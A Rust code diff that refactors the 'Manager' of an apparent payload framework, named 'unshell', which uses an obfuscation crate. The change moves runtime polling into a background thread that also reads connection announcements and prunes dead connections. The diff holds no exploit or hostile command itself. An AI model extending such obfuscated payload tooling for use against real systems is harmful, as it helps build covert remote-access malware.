@@ -1,12 +1,13 @@
 use std::{
     collections::HashMap,
     sync::{Arc, Mutex},
-    thread,
+    thread::{self, JoinHandle},
     time::Duration,
 };
 
 use crate::{
     config::{NamedComponent, PayloadConfig, RuntimeConfig},
+    network::Connection,
     *,
 };
 use module::Module;
@@ -16,10 +17,14 @@ use unshell_obfuscate::symbol;
 pub struct Manager {
     id: &'static str,
 
+    handle: Option<JoinHandle<()>>,
+
     pub modules: Vec<Module>,
 
-    active_runtimes: Vec<Box<dyn ModuleRuntime>>,
     components: HashMap<String, NamedComponent>,
+    active_runtimes: Vec<Box<dyn ModuleRuntime>>,
+
+    pub connections: Vec<Connection>,
 }
 
 // static mut MANAGER_RUNTIME: Option<Arc<Mutex<Manager>>> = None;
@@ -28,16 +33,20 @@ impl Manager {
     fn new(id: &'static str, components: Vec<NamedComponent>, modules: Vec<Module>) -> Self {
         Self {
             id,
+            handle: None,
+
             modules,
             components: components
                 .into_iter()
                 .map(|c| (c.name.to_string(), c))
                 .collect(),
             active_runtimes: Vec::new(),
+
+            connections: Vec::new(),
         }
     }
 
-    /// Create Manager, and run initilization for each Module
+    /// Create Manager, and run initialization for each Module
     #[allow(static_mut_refs)]
     pub fn start(config: &'static PayloadConfig, modules: Vec<Module>) -> Arc<Mutex<Self>> {
         // Construct self
@@ -55,6 +64,8 @@ impl Manager {
         for runtime in &config.runtime_config {
             Self::start_runtime(this.clone(), runtime);
         }
+
+        this.lock().unwrap().handle = Some(Self::start_thread(this.clone()));
 
         this
     }
@@ -85,28 +96,47 @@ impl Manager {
         }
     }
 
-    /// Iterateratively loop through all runtimes, until all are finished executing
+    /// The manager thread. receives announcements, and kills runtimes.
+    fn start_thread(this: Arc<Mutex<Self>>) -> JoinHandle<()> {
+        thread::spawn(move || {
+            loop {
+                thread::sleep(Duration::from_millis(10));
+
+                let mut this_lock = this.lock().unwrap();
+
+                if this_lock.active_runtimes.len() <= 0 {
+                    debug!("There are no more runtimes! Exiting...");
+                    break;
+                }
+
+                this_lock.active_runtimes.retain(|runtime| {
+                    if runtime.is_running() {
+                        true
+                    } else {
+                        debug!("Runtime exited!"); //TODO: Make this better
+                        false
+                    }
+                });
+
+                // Read announcements
+                this_lock.recv_connection_announcements();
+
+                // Prune dead connections
+                this_lock.prune_connections();
+
+                drop(this_lock)
+            }
+        })
+    }
+
+    /// Wait for manager thread to finish.
     pub fn join(this: Arc<Mutex<Self>>) {
         loop {
-            let mut this_lock = this.lock().unwrap();
-
-            if this_lock.active_runtimes.len() <= 0 {
-                debug!("There are no more runtimes! Exiting...");
+            if this.lock().unwrap().handle.as_ref().unwrap().is_finished() {
                 break;
             }
 
-            this_lock.active_runtimes.retain(|runtime| {
-                if runtime.is_running() {
-                    true
-                } else {
-                    debug!("Runtime exited!"); //TODO: Make this better
-                    false
-                }
-            });
-
-            drop(this_lock);
-
-            thread::sleep(Duration::from_millis(500));
+            thread::sleep(Duration::from_millis(100));
         }
     }
 
